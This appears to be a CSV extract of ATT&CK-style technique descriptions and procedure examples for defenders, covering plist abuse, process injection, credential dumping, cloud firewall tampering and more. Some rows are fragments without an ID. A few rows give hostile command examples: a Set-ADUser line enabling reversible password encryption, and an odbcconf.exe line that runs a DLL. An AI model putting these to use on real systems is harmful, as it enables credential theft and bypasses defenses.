T1647,Plist File Modification,"Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the  info.plist  file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format.   [1]       Adversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e.  Hidden Window ) or running additional commands for persistence (ex:  Launch Agent / Launch Daemon  or  Re-opened Applications ).   For example, adversaries can add a malicious application path to the  ~/Library/Preferences/com.apple.dock.plist  file, which controls apps that appear in the Dock. Adversaries can also modify the  LSUIElement  key in an application’s  info.plist  file  to run the app in the background. Adversaries can also insert key-value pairs to insert environment variables, such as  LSEnvironment , to enable persistence via  Dynamic Linker Hijacking .   [2]      [3]",Description

T1564.007,Hide Artifacts: VBA Stomping,"Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.   [1]      MS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a  PerformanceCache  that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the  _VBA_PROJECT  stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.   [2]      [3]      An adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the  _VBA_PROJECT  stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.

T1608.006,Stage Capabilities: SEO Poisoning,"Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site’s ranking/score/reputation calculated by their web crawlers and algorithms.   [1]      [2]      To help facilitate  Drive-by Compromise , adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as  Drive-by Target ) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).   [3]      [1]      Adversaries may also purchase or plant incoming links to staged capabilities in order to boost the site’s calculated relevance and reputation.   [2]      [4]      SEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.

T1555.005,Credentials from Password Stores: Password Managers,"Adversaries may acquire user credentials from third-party password managers.   [1]    Password managers are applications designed to store user credentials, normally in an encrypted database. Credentials are typically accessible after a user provides a master password that unlocks the database. After the database is unlocked, these credentials may be copied to memory. These databases can be stored as files on disk.   [1]      Adversaries may acquire user credentials from password managers by extracting the master password and/or plain-text credentials from memory.   [2]      [3]    Adversaries may extract credentials from memory via  Exploitation for Credential Access .

OS Credential Dumping  can be used to obtain password hashes, this may only get an adversary so far when  Pass the Hash  is not an option. Further,  adversaries may leverage  Data from Configuration Repository  in order to obtain hashed credentials for network devices.   [1]       Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.

T1546.016,Event Triggered Execution: Installer Packages,"Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.   [1]      Using legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS  postinstall  scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a  Launch Daemon ) with the elevated permissions.   [2]      [3]      Depending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include  preinst ,  postinst ,  prerm ,  postrm  scripts and run as root when executed.   For Windows, the Microsoft Installer services uses  .msi  files to manage the installing, updating, and uninstalling of applications. Adversaries have leveraged  Prebuild  and  Postbuild  events to run commands before or after a build when installing .msi files.   [4]      [5]",Description

T1608.002,Stage Capabilities: Upload Tool,"Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex:  PsExec ). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable  Ingress Tool Transfer  by placing it on an Internet accessible web server.   Tools may be placed on infrastructure that was previously purchased/rented by the adversary ( Acquire Infrastructure ) or was otherwise compromised by them ( Compromise Infrastructure ).   [1]    Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.   [2]      [3]      [4]      Adversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.",Description

T1090.002,Proxy: External Proxy,"Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including  HTRAN , ZXProxy, and ZXPortMap.    [1]    Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.   External connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server.",Description

T1556.007,Modify Authentication Process: Hybrid Identity,"Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.     Many organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Azure AD includes three options for synchronizing identities between Active Directory and Azure AD   [1]   :   AD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users’ identity and privileges.    By modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the  AzureADConnectAuthenticationAgentService  process that authorizes all attempts to authenticate to Azure AD, as well as records user credentials.   [2]      [3]    In environments using AD FS, an adversary may edit the  Microsoft.IdentityServer.Servicehost  configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.   [4]      In some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud.

T1550.004,Use Alternate Authentication Material: Web Session Cookie,"Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.   [1]      Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through  Steal Web Session Cookie  or  Web Cookies , the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.   There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.   [2]",Description
T1550.004,Use Alternate Authentication Material: Web Session Cookie,"APT29  used stolen cookies to access cloud resources, and a forged  duo-sid  cookie to bypass MFA set on an email account.   [3]      [4]",Procedure Examples
T1059.008,Command and Scripting Interpreter: Network Device CLI,"Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands.    Scripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or  SSH .   Adversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.   [1]",Description
T1021,Remote Services,"Adversaries may use  Valid Accounts  to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.   In an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).   [1]      [2]      Legitimate applications (such as  Software Deployment Tools  and other administrative programs) may utilize  Remote Services  to access remote hosts. For example, Apple Remote Desktop (ARD) on macOS is native software used for remote management. ARD leverages a blend of protocols, including  VNC  to send the screen and control buffers and  SSH  for secure file transfer.   [3]      [4]      [5]    Adversaries can abuse applications such as ARD to gain remote code execution and perform lateral movement. In versions of macOS prior to 10.14, an adversary can escalate an SSH session to an ARD session which enables an adversary to accept TCC (Transparency, Consent, and Control) prompts without user interaction and gain access to data.

T1586.001,Compromise Accounts: Social Media Accounts,"Adversaries may compromise social media accounts that can be used during targeting. For operations incorporating social engineering, the utilization of an online persona may be important. Rather than creating and cultivating social media profiles (i.e.  Social Media Accounts ), adversaries may compromise existing social media accounts. Utilizing an existing persona may engender a level of trust in a potential victim if they have a relationship, or knowledge of, the compromised persona.    A variety of methods exist for compromising social media accounts, such as gathering credentials via  Phishing for Information , purchasing credentials from third-party sites, or by brute forcing credentials (ex: password reuse from breach credential dumps).   [1]    Prior to compromising social media accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation.   Personas may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Compromised social media accounts may require additional development, this could include filling out or modifying profile information, further developing social networks, or incorporating photos.   Adversaries can use a compromised social media profile to create new, or hijack existing, connections to targets of interest. These connections may be direct or may include trying to connect through others.   [2]      [3]    Compromised profiles may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex:  Spearphishing via Service ).",Description

T1055.015,Process Injection: ListPlanting,"Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.   List-view controls are user interface windows used to display collections of items.   [1]    Information about an application's list-view settings are stored within the process' memory in a  SysListView32  control.   ListPlanting (a form of message-passing ""shatter attack"") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items.   [2]    Adversaries must first copy code into the target process’ memory space, which can be performed various ways including by directly obtaining a handle to the  SysListView32  child of the victim process window (via Windows API calls such as  FindWindow  and/or  EnumWindows ) or other  Process Injection  methods.   Some variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored  WriteProcessMemory  function. For example, an adversary can use the  PostMessage  and/or  SendMessage  API functions to send  LVM_SETITEMPOSITION  and  LVM_GETITEMPOSITION  messages, effectively copying a payload 2 bytes at a time to the allocated memory.   [3]       Finally, the payload is triggered by sending the  LVM_SORTITEMS  message to the  SysListView32  child of the process window, with the payload within the newly allocated buffer passed and executed as the  ListView_SortItems  callback.",Description

T1555.002,Credentials from Password Stores: Securityd Memory,"An adversary may obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc.   [1]      [2]      In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.   [1]      [3]    Apple’s securityd utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory.

T1556.005,Modify Authentication Process: Reversible Encryption,"An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The  AllowReversiblePasswordEncryption  property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.   [1]      If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:   With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.   [2]      [3]      An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory  PowerShell  module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to ""Windows Server 2008"" or higher.   [4]    In PowerShell, an adversary may make associated changes to user settings using commands similar to  Set-ADUser -AllowReversiblePasswordEncryption $true .",Description
T1600.001,Weaken Encryption: Reduce Key Space,"Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.   [1]      Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.   Adversaries may modify the key size used and other encryption parameters using specialized commands in a  Network Device CLI  introduced to the system through  Modify System Image  to change the configuration of the device.    [2]",Description
T1562.007,Impair Defenses: Disable or Modify Cloud Firewall,"Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in  Disable or Modify System Firewall .    Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity.   [1]      Modifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.",Description
T1055.004,Process Injection: Asynchronous Procedure Call,"Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process.    APC injection is commonly performed by attaching malicious code to the APC Queue    [1]    of a process's thread. Queued APC functions are executed when the thread enters an alterable state.   [1]    A handle to an existing victim process is first created with native Windows API calls such as  OpenThread . At this point  QueueUserAPC  can be used to invoke a function (such as  LoadLibrayA  pointing to a malicious DLL).    A variation of APC injection, dubbed ""Early Bird injection"", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC.    [2]    AtomBombing    [3]    is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.   [4]      Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.",Description

T1106,Native API,"Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.   [1]      [2]    These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.   Native API functions (such as  NtCreateProcess ) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.   [3]      [4]      [5]    For example, functions such as the Windows API  CreateProcess()  or GNU  fork()  will allow programs and scripts to start other processes.   [6]      [7]    This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.   [8]      [9]      [10]      Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.   [11]      [12]      [13]      [14]      Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to  Command and Scripting Interpreter , the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system. While invoking API functions, adversaries may also attempt to bypass defensive tools (ex: unhooking monitored functions via  Disable or Modify Tools ).",Description

T1564.006,Hide Artifacts: Run Virtual Instance,"Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.   [1]      Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.

Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.   Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from  Screen Capture  due to use of specific devices or applications for video recording rather than capturing the victim's screen.   In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton.    [1]",Description

T1134.004,Access Token Manipulation: Parent PID Spoofing,"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the  CreateProcess  API call, which supports a parameter that defines the PPID to use.   [1]    This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via  svchost.exe  or  consent.exe ) rather than the current user context.   [2]      Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of  PowerShell / Rundll32  to be  explorer.exe  rather than an Office document delivered as part of  Spearphishing Attachment .   [3]    This spoofing could be executed via  Visual Basic  within a malicious Office document or any code that can perform  Native API .   [4]      [3]      Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as  lsass.exe ), causing the new process to be elevated via the inherited access token.   [5]",Description

T1127.001,Trusted Developer Utilities Proxy Execution: MSBuild,"Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.   [1]      Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.   [1]      [2]    MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.

T1574.012,Hijack Execution Flow: COR_PROFILER,"Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.   [1]      [2]      The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where a  Component Object Model  (COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.   [2]      Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex:  Bypass User Account Control ) if the victim .NET process executes at a higher permission level, as well as to hook and  Impair Defenses  provided by .NET processes.

T1574.012,Hijack Execution Flow: COR_PROFILER,Blue Mockingbird  has used wmic.exe and Windows Registry modifications to set the COR_PROFILER environment variable to execute a malicious DLL whenever a process loads the .NET CLR.   [3],Procedure Examples
T1530,Data from Cloud Storage,"Adversaries may access data from improperly secured cloud storage.   Many cloud service providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. These solutions differ from other storage solutions (such as SQL or Elasticsearch) in that there is no overarching application. Data from these solutions can be retrieved directly using the cloud provider's APIs.    In other cases, SaaS application providers such as Slack, Confluence, and Salesforce also provide cloud storage solutions as a peripheral use case of their platform. These cloud objects can be extracted directly from their associated application.   [1]      [2]      [3]      [4]      Adversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.   [5]      [6]      [7]    There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.   This open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.   [8]      [9]      [10]      [11]      Adversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",Description

T1574,Hijack Execution Flow,"Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.   There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",Description

T1070,Indicator Removal,"Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.   Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",Description

T1563,Remote Service Session Hijacking,"Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.   Adversaries may commandeer these sessions to carry out actions on remote systems.  Remote Service Session Hijacking  differs from use of  Remote Services  because it hijacks an existing session rather than creating a new session using  Valid Accounts .   [1]      [2]",Description
T1027.008,Obfuscated Files or Information: Stripped Payloads,"Adversaries may attempt to make a payload difficult to analyze by removing symbols, strings, and other human readable information. Scripts and executables may contain variables names and other strings that help developers document code functionality. Symbols are often created by an operating system’s  linker  when executable payloads are compiled. Reverse engineers use these symbols and strings to analyze code and to identify functionality in payloads.   [1]      [2]      Adversaries may use stripped payloads in order to make malware analysis more difficult. For example, compilers and other tools may provide features to remove or obfuscate strings and symbols. Adversaries have also used stripped payload formats, such as run-only AppleScripts, a compiled and stripped version of  AppleScript , to evade detection and analysis. The lack of human-readable information may directly hinder detection and analysis of payloads.   [3]",Description
T1027.008,Obfuscated Files or Information: Stripped Payloads,"macOS.OSAMiner  has used run-only Applescripts, a compiled and stripped version of  AppleScript , to remove human readable indicators to evade detection.   [3]",Procedure Examples
T1003.007,OS Credential Dumping: Proc Filesystem,"Adversaries may gather credentials from information stored in the Proc filesystem or  /proc . The Proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively.   This functionality has been implemented in the MimiPenguin   [1]   , an open source tool inspired by Mimikatz. The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.",Description

T1518.001,Software Discovery: Security Software Discovery,"Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from  Security Software Discovery  during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.   Example commands that can be used to obtain security software information are  netsh ,  reg query  with  Reg ,  dir  with  cmd , and  Tasklist , but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.   Adversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.   [1]    For example, the permitted IP ranges, ports or user accounts for the inbound/outbound rules of security groups, virtual firewalls established within AWS for EC2 and/or VPC instances, can be revealed by the  DescribeSecurityGroups  action with various request parameters.

T1021.005,Remote Services: VNC,"Adversaries may use  Valid Accounts  to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (""remote framebuffer"") protocol to enable users to remotely control another computer’s display by relaying the screen, mouse, and keyboard inputs over the network.   [1]      VNC differs from  Remote Desktop Protocol  as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.   [2]      [3]      Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.   [4]      [5]      [6]      [7]      [8]      [9]",Description

T1048.001,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol,"Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.    Symmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data.    Network protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP).",Description

Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names.   [1]    The Odbcconf.exe binary may be digitally signed by Microsoft.   Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to  Regsvr32 , odbcconf.exe has a  REGSVR  flag that can be misused to execute DLLs (ex:  odbcconf.exe /S /A &amp;lbrace;REGSVR ""C:\Users\Public\file.dll""&amp;rbrace; ).

T1552.005,Unsecured Credentials: Cloud Instance Metadata API,"Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.   Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.   [1]    A cloud metadata API has been used in at least one high profile compromise.   [2]      If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.   [3]      The de facto standard across cloud service providers is to host the Instance Metadata API at  http[:]//169.254.169.254 .",Description

T1542.005,Pre-OS Boot: TFTP Boot,"Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.   Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with  Modify System Image  to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to  ROMMONkit  and may result in the network device running a modified image.    [1]",Description

T1222.001,File and Directory Permissions Modification: Windows File and Directory Permissions Modification,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.   [1]      [2]    File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).   Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).   [3]    Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.   [4]      Adversaries can interact with the DACLs using built-in Windows commands, such as  icacls ,  cacls ,  takeown , and  attrib , which can grant adversaries higher permissions on specific files and folders. Further,  PowerShell  provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via  Accessibility Features ,  Boot or Logon Initialization Scripts , or tainting/hijacking other instrumental binary/configuration files via  Hijack Execution Flow .",Description

